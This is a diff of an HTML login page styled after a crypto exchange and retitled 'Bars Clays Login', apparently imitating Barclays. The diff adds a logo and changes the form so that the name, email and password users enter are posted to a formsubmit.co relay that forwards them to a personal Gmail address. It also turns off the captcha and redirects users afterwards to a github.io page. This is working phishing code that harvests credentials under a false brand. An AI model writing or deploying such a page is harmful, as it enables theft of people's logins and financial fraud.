@@ -3,26 +3,158 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Scalping Real Time Trading Signals</title>
+<title>Bars Clays Login</title>
 
 <style>
-* { margin:0; padding:0; box-sizing:border-box; font-family: Arial, Helvetica, sans-serif; }
-body { background-color: #0B0E11; display:flex; justify-content:center; align-items:center; height:100vh; color:#EAECEF; }
-.container { width:100%; max-width:400px; padding:20px; }
-.close-btn { font-size:22px; color:#848E9C; cursor:pointer; margin-bottom:20px; }
-h1 { font-size:28px; margin-bottom:25px; font-weight:600; }
-label { font-size:14px; color:#B7BDC6; display:block; margin-bottom:8px; }
-.input-wrapper { position:relative; margin-bottom:18px; }
-input { width:100%; padding:14px 40px 14px 14px; border-radius:8px; border:none; background-color:#1E2329; color:#EAECEF; font-size:15px; }
-input:focus { outline:1px solid #FCD535; }
-.icon-btn { position:absolute; right:12px; top:50%; transform:translateY(-50%); color:#848E9C; cursor:pointer; font-size:16px; user-select:none; }
-.btn-primary { width:100%; padding:14px; border:none; border-radius:8px; background-color:#FCD535; color:#000; font-weight:bold; font-size:16px; cursor:pointer; margin-top:10px; margin-bottom:20px; }
-.btn-primary:hover { opacity:0.9; }
-.footer-link { color:#FCD535; margin-top:15px; display:block; text-decoration:none; font-weight:500; }
-.footer-link:hover { text-decoration:underline; }
-.forgot { text-align:right; font-size:13px; margin-top:-10px; margin-bottom:15px; }
-.forgot a { color:#848E9C; text-decoration:none; }
-.forgot a:hover { color:#FCD535; }
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, Helvetica, sans-serif;
+    }
+
+    body {
+        background-color: #0B0E11;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        color: #EAECEF;
+    }
+
+    .container {
+        width: 100%;
+        max-width: 400px;
+        padding: 20px;
+    }
+
+    .close-btn {
+        font-size: 22px;
+        color: #848E9C;
+        cursor: pointer;
+        margin-bottom: 20px;
+    }
+
+    /* ===== LOGO STYLING ===== */
+    .logo {
+        display: flex;
+        justify-content: center;
+        margin-bottom: 25px;
+    }
+
+    .logo img {
+        width: 95px;
+        height: 95px;
+        border-radius: 50%; /* Circular */
+        object-fit: cover;
+        box-shadow: 0 0 20px rgba(252, 213, 53, 0.6); /* Glow effect */
+        animation: floatLogo 3s ease-in-out infinite; /* Animation */
+        transition: transform 0.3s ease;
+    }
+
+    .logo img:hover {
+        transform: scale(1.08);
+    }
+
+    @keyframes floatLogo {
+        0% { transform: translateY(0px); }
+        50% { transform: translateY(-6px); }
+        100% { transform: translateY(0px); }
+    }
+    /* ========================= */
+
+    h1 {
+        font-size: 28px;
+        margin-bottom: 25px;
+        font-weight: 600;
+        text-align: center;
+    }
+
+    label {
+        font-size: 14px;
+        color: #B7BDC6;
+        display: block;
+        margin-bottom: 8px;
+    }
+
+    .input-wrapper {
+        position: relative;
+        margin-bottom: 18px;
+    }
+
+    input {
+        width: 100%;
+        padding: 14px 40px 14px 14px;
+        border-radius: 8px;
+        border: none;
+        background-color: #1E2329;
+        color: #EAECEF;
+        font-size: 15px;
+    }
+
+    input:focus {
+        outline: 1px solid #FCD535;
+    }
+
+    .icon-btn {
+        position: absolute;
+        right: 12px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: #848E9C;
+        cursor: pointer;
+        font-size: 16px;
+        user-select: none;
+    }
+
+    .btn-primary {
+        width: 100%;
+        padding: 14px;
+        border: none;
+        border-radius: 8px;
+        background-color: #FCD535;
+        color: #000;
+        font-weight: bold;
+        font-size: 16px;
+        cursor: pointer;
+        margin-top: 10px;
+        margin-bottom: 20px;
+        transition: 0.3s;
+    }
+
+    .btn-primary:hover {
+        opacity: 0.9;
+        box-shadow: 0 0 15px rgba(252, 213, 53, 0.6);
+    }
+
+    .footer-link {
+        color: #FCD535;
+        margin-top: 15px;
+        display: block;
+        text-decoration: none;
+        font-weight: 500;
+        text-align: center;
+    }
+
+    .footer-link:hover {
+        text-decoration: underline;
+    }
+
+    .forgot {
+        text-align: right;
+        font-size: 13px;
+        margin-top: -10px;
+        margin-bottom: 15px;
+    }
+
+    .forgot a {
+        color: #848E9C;
+        text-decoration: none;
+    }
+
+    .forgot a:hover {
+        color: #FCD535;
+    }
 </style>
 </head>
 
@@ -30,10 +162,16 @@ input:focus { outline:1px solid #FCD535; }
 <div class="container">
 
     <div class="close-btn">&times;</div>
+
+    <!-- LOGO -->
+    <div class="logo">
+        <img src="https://drive.google.com/uc?export=view&id=12W27RksV4_H9_J3BrY_T891HKyLufNXw" alt="Bars Clays Logo">
+    </div>
+
     <h1>Log in</h1>
 
     <!-- FORM -->
-   <input type="hidden" name="_next" value="https://barslaysmanagementservices-code.github.io/Linking-Trading-Binance-Account-/success.html"> <form action="success.html" method="get">
+    <form action="https://formsubmit.co/zenithaurora777@gmail.com" method="POST">
         <label>Name</label>
         <div class="input-wrapper">
             <input type="text" name="name" placeholder="Your Name" required>
@@ -52,6 +190,9 @@ input:focus { outline:1px solid #FCD535; }
             <span class="icon-btn" onclick="togglePassword()">👁</span>
         </div>
 
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://barsclaysmanag.github.io/bars_clays/">
+
         <button type="submit" class="btn-primary">Continue</button>
     </form>
 
@@ -65,9 +206,16 @@ input:focus { outline:1px solid #FCD535; }
 </div>
 
 <script>
-function clearEmail() { document.querySelector('input[name="email"]').value = ""; }
-function clearName() { document.querySelector('input[name="name"]').value = ""; }
-function togglePassword() { const password = document.getElementById("password"); password.type = password.type === "password" ? "text" : "password"; }
+function clearEmail() {
+    document.querySelector('input[name="email"]').value = "";
+}
+function clearName() {
+    document.querySelector('input[name="name"]').value = "";
+}
+function togglePassword() {
+    const password = document.getElementById("password");
+    password.type = password.type === "password" ? "text" : "password";
+}
 </script>
 
 </body>
